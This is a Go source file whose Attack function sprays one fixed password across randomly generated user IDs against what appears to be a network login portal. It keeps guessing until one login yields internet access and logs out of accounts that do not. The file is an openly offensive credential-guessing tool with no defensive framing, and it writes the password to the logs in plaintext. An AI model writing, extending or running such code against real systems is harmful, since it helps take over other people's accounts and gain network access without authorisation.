package auth

import (
	"context"
	"log/slog"
	"time"
)

type AttackConfig struct {
	Host     string
	Link     string
	Password string
}

func Attack(cfg *AttackConfig) error {
	logger := slog.With("component", "attack")

	logger.Info("detecting connection")
	if TestConnection() {
		return nil
	}
	logger.Info("no connection, start attack", "host", cfg.Host, "password", cfg.Password)

	base, err := FindPortal(cfg.Host)
	if err != nil {
		return err
	}

	for {
		tried := make(map[string]struct{})

		var userid string
		for {
			userid = RandomUserid()

			if _, ok := tried[userid]; ok {
				continue
			} else {
				tried[userid] = struct{}{}
			}

			err := Login(&LoginConfig{
				Base:     base,
				Link:     cfg.Link,
				UserID:   userid,
				Password: cfg.Password,
			})
			if err != nil {
				continue
			}

			break
		}

		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)

		go func() {
			for {
				time.Sleep(1 * time.Second)

				if TestConnection() {
					cancel()
				}
			}
		}()

		<-ctx.Done()

		switch ctx.Err() {
		case context.DeadlineExceeded:
			logger.Info("no connection after login, keep attacking", "userid", userid)
			Logout(&LogoutConfig{
				Base:   base,
				Link:   cfg.Link,
				UserID: userid,
			})
		case context.Canceled:
			logger.Info("connected, attack finished", "userid", userid)
			return nil
		}
	}
}
